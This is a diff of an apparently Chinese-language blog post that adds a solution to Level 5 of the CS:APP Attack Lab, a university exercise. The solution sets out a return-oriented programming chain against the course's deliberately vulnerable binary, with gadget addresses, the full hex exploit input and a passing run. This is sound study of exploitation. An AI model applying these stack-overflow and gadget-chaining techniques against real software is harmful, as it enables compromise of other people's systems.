@@ -94,7 +94,7 @@ window.onload = wrap_img;
        • <span class="read-time" title="Estimated read time">
     
     
-      7 min read
+      9 min read
     
 </span></p>
 
@@ -552,11 +552,104 @@ PASS: Would have posted the following:
 <h4 id="0x22-level-5">
 <a class="anchor" href="#0x22-level-5" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x2.2 Level 5</h4>
 
+<p>Level5 和 Level3 类似，不同点在于 Level3 使用自己插入的代码进行攻击，而 Level5 需要使用 gadget 的方式，这让任务变得更难了。</p>
+
+<p>按照 Level3 的要求，需要传入一个字符串的指针，字符串由于有被栈覆盖的风险，所以需要放在栈顶的最大可能位置。在 Level3 里面获取字符串的地址比较容易，因为每次程序启动的地址都是一样的，这意味着每次都可以确定写入的字符串地址，但是在 Level5 中，这个方式并不可行，因为每次程序执行的地址都不一样。</p>
+
+<p>那么有什么办法可以获取到字符串的地址呢？既然绝对地址不可获取，那么我们可以通过相对地址的方式来进行获取，具体来说就是通过 <code class="language-plaintext highlighter-rouge">getbuf</code> 执行完之后的地址作为基础地址，然后通过计算插入的字符串地址和这个位置的偏移量来得到最终的字符串地址。可以用下面的一个示意图来举例。</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">movq</span> <span class="o">%</span><span class="nx">rsp</span><span class="p">,</span> <span class="o">%</span><span class="nx">rdi</span>
+<span class="nx">popq</span> <span class="o">%</span><span class="nx">rsi</span>
+<span class="nx">offset</span>
+<span class="nx">lea</span>  <span class="p">(</span><span class="o">%</span><span class="nx">rdi</span><span class="p">,</span><span class="o">%</span><span class="nx">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="nx">rdi</span>
+<span class="mh">0x4018fa</span> <span class="nx">touch3</span> <span class="nx">addr</span>
+<span class="dl">""</span> <span class="nx">string</span> <span class="nx">content</span>
+</code></pre></div></div>
+
+<p>在 offset 上面的指令将栈帧 <code class="language-plaintext highlighter-rouge">%rsp</code> 放到 <code class="language-plaintext highlighter-rouge">%rdi</code> 中保存，这样就可以保留基础地址，然后将 offset 的值放到 <code class="language-plaintext highlighter-rouge">%rsi</code> 中，最后通过 <code class="language-plaintext highlighter-rouge">lea</code> 进行地址的计算，获得 string 的有效地址。如果可以自己插入指令去运行，非常简单就可以完成这个实验，但是问题是我们无法获取插入指令的地址，就像上面说的，每次地址都会变化，所以需要采用 gadget 的方式，即在已有代码中对片段进行选择。</p>
+
+<p>通过在 <em>rtarget.s</em> 中对代码片段进行挑选，通过组合之后可以获得下面的代码，其中 <code class="language-plaintext highlighter-rouge">movq %rsp, %rdi</code> 因为没有现成的代码片段，所以被拆分成了 <code class="language-plaintext highlighter-rouge">movq %rsp, %rax</code> 和 <code class="language-plaintext highlighter-rouge">movq %rax, %rdi</code>。</p>
+
+<p>而 <code class="language-plaintext highlighter-rouge">popq %rsi</code> 则需要更多的指令进行完成，这里就不具体解释了，直接通过阅读下面的汇编代码就可以了解对应的内容。</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">401</span><span class="nx">a06</span>   <span class="mi">48</span> <span class="mi">89</span> <span class="nx">e0</span> <span class="nx">c3</span>       <span class="nx">mov</span> <span class="o">%</span><span class="nx">rsp</span><span class="p">,</span> <span class="o">%</span><span class="nx">rax</span>
+<span class="mi">4019</span><span class="nx">c5</span>   <span class="mi">48</span> <span class="mi">89</span> <span class="nx">c7</span> <span class="mi">90</span> <span class="nx">c3</span>    <span class="nx">mov</span> <span class="o">%</span><span class="nx">rax</span><span class="p">,</span> <span class="o">%</span><span class="nx">rdi</span>
+<span class="mi">4019</span><span class="nx">cc</span>   <span class="mi">58</span> <span class="mi">90</span> <span class="nx">c3</span>          <span class="nx">popq</span> <span class="o">%</span><span class="nx">rax</span> <span class="p">(</span><span class="mi">72</span> <span class="o">-&gt;</span> <span class="o">%</span><span class="nx">rax</span><span class="p">)</span>
+<span class="mh">0x48</span><span class="p">(</span><span class="mi">72</span><span class="p">)</span> <span class="nx">offset</span>            
+<span class="mi">401</span><span class="nx">a20</span>   <span class="mi">89</span> <span class="nx">c2</span> <span class="mi">00</span> <span class="nx">c9</span> <span class="nx">c3</span>    <span class="nx">movl</span> <span class="o">%</span><span class="nx">eax</span><span class="p">,</span> <span class="o">%</span><span class="nx">edx</span>
+<span class="mi">401</span><span class="nx">a34</span>   <span class="mi">89</span> <span class="nx">d1</span> <span class="mi">38</span> <span class="nx">c9</span> <span class="nx">c3</span>    <span class="nx">movl</span> <span class="o">%</span><span class="nx">edx</span><span class="p">,</span> <span class="o">%</span><span class="nx">ecx</span>
+<span class="mi">401</span><span class="nx">a27</span>   <span class="mi">89</span> <span class="nx">ce</span> <span class="mi">38</span> <span class="nx">c0</span> <span class="nx">c3</span>    <span class="nx">movl</span> <span class="o">%</span><span class="nx">ecx</span><span class="p">,</span> <span class="o">%</span><span class="nx">esi</span>
+<span class="mi">4019</span><span class="nx">d6</span>   <span class="mi">48</span> <span class="mi">8</span><span class="nx">d</span> <span class="mi">04</span> <span class="mi">37</span> <span class="nx">c3</span>    <span class="p">(</span><span class="o">%</span><span class="nx">rdi</span><span class="p">,</span><span class="o">%</span><span class="nx">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="nx">rax</span> 
+<span class="mi">4019</span><span class="nx">c5</span>   <span class="mi">48</span> <span class="mi">89</span> <span class="nx">c7</span> <span class="mi">90</span> <span class="nx">c3</span>    <span class="nx">movq</span> <span class="o">%</span><span class="nx">rax</span><span class="p">,</span> <span class="o">%</span><span class="nx">rdi</span>
+<span class="mi">4018</span><span class="nx">fa</span>   <span class="nx">touch</span> <span class="nx">addr</span>
+<span class="nx">string</span> <span class="nx">content</span>
+</code></pre></div></div>
+
+<p>最后来决定 <em>offset</em> 的值，通过计算在字符串内容之前插入的 <em>gadget</em> 和其他的内容的行数，可以算出在 10 进制下是 9*8 = 72，在 16 进制下则为 48。</p>
+
+<p>最终写入的 txt 文本为</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">06</span> <span class="mi">1</span><span class="nx">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="nx">c5</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="nx">cc</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="mi">48</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="mi">20</span> <span class="mi">1</span><span class="nx">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="mi">34</span> <span class="mi">1</span><span class="nx">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="mi">27</span> <span class="mi">1</span><span class="nx">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="nx">d6</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="nx">c5</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="nx">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="mi">35</span> <span class="mi">39</span> <span class="mi">62</span> <span class="mi">39</span> <span class="mi">39</span> <span class="mi">37</span> <span class="mi">66</span> <span class="mi">61</span> 
+<span class="mi">00</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hex2raw <span class="nt">-i</span> rtarget.3.txt | ./rtarget <span class="nt">-q</span>
+
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3<span class="o">(</span><span class="s2">"59b997fa"</span><span class="o">)</span>
+Valid solution <span class="k">for </span>level 3 with target rtarget
+PASS: Would have posted the following:
+</code></pre></div></div>
+
 <h3 id="0x3-conclusion">
 <a class="anchor" href="#0x3-conclusion" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x3 Conclusion</h3>
 
+<p>通过完成 attack lab，相当于自己去走一遍黑客攻击的流程，之前一直对黑客是如何攻击的并不清楚，而且也比较好奇，这个 lab 虽然简单，却通过两种攻击方式的演示详细地揭示了这个过程，而且通过自己动手做实验，更清楚了其中的流程，算是解答了之前关于黑客攻击的一些疑惑。</p>
+
+<p>另外这个实验虽然是一个攻击实验，但是却给了我们一些启发，了解敌人的攻击方式之后可以更好地为防御他们做准备。同时通过这个实验，再一次巩固了汇编的内容，加深了栈帧的理解，对程序调用，压栈和退站有了更好的理解。</p>
+
 <h3 id="0x4-reference">
 <a class="anchor" href="#0x4-reference" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x4 Reference</h3>
+
+<ul>
+  <li><a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-f21/www/recitations/rec05_slides.pdf">recitation05-attacklab.pptx (cmu.edu)</a></li>
+  <li><a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf (cmu.edu)</a></li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>[《深入理解计算机系统》Attack Lab实验解析</td>
+          <td>Yi’s Blog (earthaa.github.io)](https://earthaa.github.io/2020/02/11/CSAPP-Attacklab/)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>[《深入理解计算机系统》实验3.Attack Lab</td>
+          <td>贺巩山的博客 (hegongshan.com)](https://www.hegongshan.com/2021/06/02/csapp-3-attack-lab/)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
 
   </div><!-- from https://github.com/utterance/utterances -->
 <script src="https://utteranc.es/client.js"
